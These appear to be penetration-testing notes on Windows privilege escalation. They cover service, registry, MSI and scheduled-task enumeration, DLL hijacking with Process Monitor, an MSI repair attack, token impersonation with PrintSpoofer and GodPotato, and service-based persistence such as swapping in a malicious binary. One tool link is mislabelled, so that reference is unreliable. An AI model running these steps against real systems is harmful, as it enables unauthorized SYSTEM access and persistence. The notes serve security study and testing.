# Services, Installers & Updaters — Technical Notes

> Practical notes, enumeration methodology, and exploitation workflow
> for the Windows services / installer attack surface.

---

## Enumeration Checklist

### Phase 1: Service Enumeration

```powershell
# List all services and their binary paths
Get-WmiObject Win32_Service | Select-Object Name, StartMode, State, PathName, StartName

# Check for unquoted paths
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '"*' -and $_.PathName -like '* *'} | Select-Object Name, PathName

# Check service binary ACLs (PowerSploit)
Get-ModifiableServiceFile

# PrivescCheck (comprehensive — preferred)
Invoke-PrivescCheck -Extended
```

```cmd
:: sc.exe equivalents
sc query type= all state= all
sc qc <service_name>
wmic service get name,pathname,startname,startmode
```

### Phase 2: Registry Key ACLs

```powershell
# Check service registry key ACLs
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"
foreach ($svc in $services) {
    $acl = Get-Acl $svc.PSPath
    # Look for write access for current user or "Users" / "Authenticated Users"
    $acl.Access | Where-Object {$_.IdentityReference -match "Users" -and $_.FileSystemRights -match "Write"}
}
```

### Phase 3: MSI/Installer Enumeration

```cmd
:: List installed products (advertised = repair-capable)
wmic product get name,identifyingnumber,installlocation

:: Check AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: List cached MSIs
dir C:\Windows\Installer\*.msi
```

### Phase 4: Scheduled Task Enumeration

```cmd
schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"
```

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest" -or $_.Principal.UserId -eq "SYSTEM"} |
    Select-Object TaskName, TaskPath, @{N="Action";E={$_.Actions.Execute}}
```

---

## DLL Hijacking Methodology (Process Monitor)

**Step-by-step with Sysinternals Process Monitor:**

1. Open Process Monitor as administrator
2. Add filters:
   - `Process Name` → target service binary (e.g., `svchost.exe` for specific service)
   - `Result` → `NAME NOT FOUND` (catches missing DLL loads)
   - `Path` → ends with `.dll`
3. Restart the service or trigger its execution
4. Review results — look for DLL loads from directories writable by current user:
   - `C:\` root (often writable by default on older Windows)
   - `%TEMP%` or `%APPDATA%` (always writable but lower-value)
   - `C:\ProgramData\Vendor\` (sometimes writable)
   - PATH entries (check each with `icacls`)

**Automation:**
```powershell
# PrivescCheck covers DLL hijacking
Invoke-PrivescCheck -Extended -Report "report" -Format TXT
```

---

## MSI Repair Attack — Workflow

```
1. Find an advertised MSI product:
   wmic product get name,identifyingnumber

2. Note the product code GUID.

3. Locate cached MSI:
   dir C:\Windows\Installer\*.msi
   (Find the one matching the product — use msiinfo or orca.exe to read)

4. Trigger repair:
   msiexec /fav {PRODUCT-CODE-GUID}

5. During repair, MSI performs privileged file operations.
   Use InstallerFileTakeOver PoC to intercept junction manipulation.

6. Redirect the file move to a high-value target path.

Reference: https://github.com/klinix5/InstallerFileTakeOver
```

---

## Token Impersonation from Service Context

If you have code execution as a Windows service account (e.g., IIS AppPool, MSSQL):

```
1. Check current privileges:
   whoami /priv

2. If SeImpersonatePrivilege is present:
   → Use PrintSpoofer: PrintSpoofer.exe -i -c cmd
   → Or GodPotato: GodPotato.exe -cmd "cmd /c whoami"
   → Or SweetPotato for older systems

3. If SeAssignPrimaryTokenPrivilege is present:
   → CreateProcessAsUser path available
   → FullPowers.exe to recover all missing service privileges first

4. Verify SYSTEM:
   whoami
```

**Reference tools:**
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer
- GodPotato: https://github.com/BeichenDream/GodPotato
- FullPowers: https://github.com/itm4n/FullPowers
- SweetPotato: https://github.com/EspressoCake/HandleKatz (modern)

---

## Service-Based Persistence Techniques

| Technique | Command | Privilege Required |
|-----------|---------|-------------------|
| New service creation | `sc create` | Administrator |
| Existing service binary replace | `copy /b malicious.exe service.exe` | Write on binary |
| Registry ImagePath modify | `reg add HKLM\...Services\svc /v ImagePath` | Write on reg key |
| WMI subscription | `Set-WMIInstance __EventFilter` | Administrator (usually) |
| Scheduled task | `schtasks /create` | Administrator for SYSTEM tasks |

---

## Key Windows Internals Facts for This Attack Surface

### Service Account Privilege Summary

| Account | SeImpersonatePrivilege | SeAssignPrimaryTokenPrivilege | Notes |
|---------|----------------------|-------------------------------|-------|
| LocalSystem | Yes | Yes | Full system privileges |
| LocalService | Yes | No | Network access limited |
| NetworkService | Yes | No | Network credentials |
| IIS AppPool accounts | Yes | No | Web server service context |
| MSSQL service | Yes | No | Database service context |
| Custom service accounts | Varies | Varies | Depends on configuration |

### MSI Execution Contexts

| Phase | Context | Can Access Network? |
|-------|---------|-------------------|
| Immediate | User/Admin | Yes |
| Deferred (elevated install) | SYSTEM | No |
| Deferred (non-elevated) | User | Yes |
| Rollback | SYSTEM | No |
| Commit | User/Admin | Yes |

### DLL Search Order (Standard)

1. KnownDLLs (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
2. DLL Redirection folder (`<exe_dir>\<exe_name>.local\`)
3. Application manifest SxS
4. Loaded modules list (already loaded in process)
5. System directory (`C:\Windows\System32\`)
6. 16-bit system directory (`C:\Windows\System\`)
7. Windows directory (`C:\Windows\`)
8. **Current directory** ← dangerous if attacker-controlled
9. **PATH directories** ← most common hijack target
